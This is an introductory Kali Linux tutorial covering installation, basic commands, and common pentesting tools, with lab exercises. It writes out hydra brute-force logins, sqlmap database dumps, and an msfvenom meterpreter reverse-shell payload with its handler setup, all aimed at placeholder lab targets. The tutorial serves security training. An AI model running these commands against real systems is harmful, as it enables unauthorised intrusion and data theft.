# Kali Linux Fundamentals

## What is Kali Linux?

Kali Linux is an operating system specialized for **cybersecurity**, developed by Offensive Security (now OffSec), based on **Debian**. Kali comes with **600+ pentesting tools** covering: reconnaissance, scanning, exploitation, post-exploitation, digital forensics, and more.

![Kali Linux](https://www.kali.org/images/kali-logo.svg)

> **Caption:** Kali Linux logo – the standard OS for pentesters.

---

## What is Kali used for?

| Field | Typical Tools |
|-------|---------------|
| Information Gathering | `nmap`, `theHarvester`, `maltego` |
| Vulnerability Analysis | `nikto`, `openvas` |
| Web Application | `burpsuite`, `sqlmap`, `ffuf` |
| Password Attacks | `hashcat`, `john`, `hydra` |
| Wireless Attacks | `aircrack-ng`, `wifite` |
| Exploitation | `metasploit`, `msfvenom` |
| Post Exploitation | `mimikatz`, `powershell-empire` |
| Forensics | `autopsy`, `volatility`, `binwalk` |

![Kali desktop](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRS8VmnLDY6Pi_RWSd6KJCW0-CY_ig98uAVWFt_92stAw&s)

---

## Installing Kali

### Minimum Requirements

| Component | Requirement |
|-----------|-------------|
| RAM | 2GB (4GB recommended) |
| Disk | 20GB |
| CPU | 2+ cores |

### Installation Methods

1. **Bare Metal** – real machine
2. **Virtual Machine** – recommended for beginners (VMware / VirtualBox)
3. **WSL** – run inside Windows
4. **Live USB / USB Persistence** – no install needed
5. **Docker** – `docker run -it kalilinux/kali-rolling /bin/bash`

```bash
# Install via Docker
docker run -t -i kalilinux/kali-rolling /bin/bash
apt update && apt install -y kali-linux-headless
```

---

## Kali Structure

### Terminal & Root

- Kali defaults to the **root** user (or regular user + `sudo`).
- The terminal is the center of everything.

```bash
sudo su          # Switch to root
whoami           # Show current user
id               # UID, GID, groups
```

### Important Directories

| Path | Purpose |
|------|---------|
| `/usr/share/wordlists` | Wordlists (rockyou.txt, ...) |
| `/etc` | System configuration |
| `/var/log` | System logs |
| `/root` | Root's home |
| `/opt` | Manually installed tools |

```bash
ls -la /usr/share/wordlists
# rockyou.txt is compressed -> extract:
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## Kali Startup & Essential Commands

```bash
# Update & upgrade the system
sudo apt update
sudo apt upgrade -y

# Install additional tools
sudo apt install <tool> -y

# Locate installed tools
which nmap
whereis hydra

# View processes
ps aux
top
```

---

## The "Big Three" Tools to Start With

### 1. Nmap – Network Scanner

```bash
nmap -sV -sC -O target_ip
# -sV: service versions, -sC: default scripts, -O: OS detection
```

### 2. Burp Suite – Web Proxy

- Used to intercept, modify, and replay HTTP requests.
- **Proxy > Intercept** tab to block requests.
- **Repeater** tab to edit and resend.

### 3. Metasploit – Exploitation Framework

```bash
msfconsole
search <vulnerability>
use <module>
set RHOSTS <target>
run
```

---

## Basic Password Attacks

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

### Hashcat

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0: MD5, -a 0: dictionary attack
```

### Hydra – brute force login

```bash
hydra -l admin -P passwords.txt ssh://target_ip
hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

---

## Web Application Tools

### SQLMap

```bash
sqlmap -u "http://target/index.php?id=1" --dbs
sqlmap -u "http://target/index.php?id=1" -D <db> --tables
sqlmap -u "http://target/index.php?id=1" -D <db> -T <table> --dump
```

### FFUF – directory fuzzing

```bash
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302
```

### Gobuster

```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster vhost -u http://target -w vhosts.txt
```

---

## Working with Metasploit

```bash
msfconsole -q

# Generate payload with msfvenom
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf

# Inside msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit -j
```

---

## Kali Workflow Tips

1. **Snapshot your VM** before labs – always have a restore point.
2. Use **tmux** to keep SSH sessions alive after disconnect.
3. Keep notes with **CherryTree** or **Obsidian**.
4. Update tools regularly: `sudo apt update && sudo apt upgrade`.
5. Don't use Kali as your daily OS – it's for pentesting only.
6. Use **Wireshark** to understand packets instead of blindly running tools.

```bash
# Install useful tools
sudo apt install -y tmux cherrytree seclists gobuster ffuf
```

---

## Practice Exercises

1. Install Kali in a VM (VirtualBox/VMware), take a snapshot.
2. `sudo apt update && sudo apt upgrade`.
3. Extract `rockyou.txt` and count its lines.
4. Scan a lab machine (Metasploitable / DVWA) with `nmap -sV -sC`.
5. Use `hydra` to brute force SSH login on a VM you set up yourself.
6. Use `sqlmap` to dump a database in DVWA.

---

> **Pro Tip:** Don't run tools blindly. Understand input/output, verify results manually. A great hacker understands every line of a tool's output.
